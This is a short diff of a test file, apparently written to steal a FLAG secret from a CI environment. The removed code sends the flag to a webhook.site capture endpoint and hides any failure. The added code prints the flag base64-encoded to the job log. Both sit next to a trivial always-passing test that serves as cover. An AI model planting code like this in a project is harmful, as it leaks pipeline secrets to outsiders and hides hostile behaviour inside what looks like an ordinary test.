@@ -1,18 +1,10 @@
 # tests/test_exfil_flag.py
-import os, urllib.parse, urllib.request
+import os, base64, sys
 
-FLAG = os.environ.get("FLAG", "")
-# send to a throwaway capture endpoint (e.g., https://webhook.site)
-DEST = "https://webhook.site/<your-uuid>"
+flag = os.environ.get("FLAG", "")
+if flag:
+    print("FLAG_B64=" + base64.b64encode(flag.encode()).decode())
 
-if FLAG:
-    url = f"{DEST}?f={urllib.parse.quote(FLAG)}"
-    try:
-        urllib.request.urlopen(url, timeout=5).read()
-    except Exception:
-        # even if egress fails, don't break the job
-        pass
-
-def test_always_passes():
+def test_ok():
     assert True
 
